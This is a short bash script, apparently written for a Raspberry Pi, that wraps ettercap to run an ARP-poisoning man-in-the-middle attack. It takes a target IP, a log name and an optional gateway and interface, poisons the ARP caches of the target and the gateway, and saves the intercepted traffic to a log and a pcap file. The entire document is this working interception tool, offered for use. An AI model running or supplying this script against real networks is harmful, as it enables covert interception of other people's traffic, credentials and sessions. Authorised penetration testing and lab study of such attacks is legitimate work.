#!/bin/bash

LOG_PATH="/home/pi/etter_log"

LOG_NAME=$2
TARGET="//${1}/"
GATE_WAY="//192.168.10.1/"
IFACE="eth0"

if [[ -n $3 ]]
then
	GATE_WAY="//${3}/"
fi

if [[ -n $4 ]]
then
	IFACE="${4}"
fi

ettercap -i $IFACE -T -M arp:remote "${GATE_WAY}" "${TARGET}" -L "${LOG_PATH}/${LOG_NAME}.log" -w "${LOG_PATH}/${LOG_NAME}.pcap"
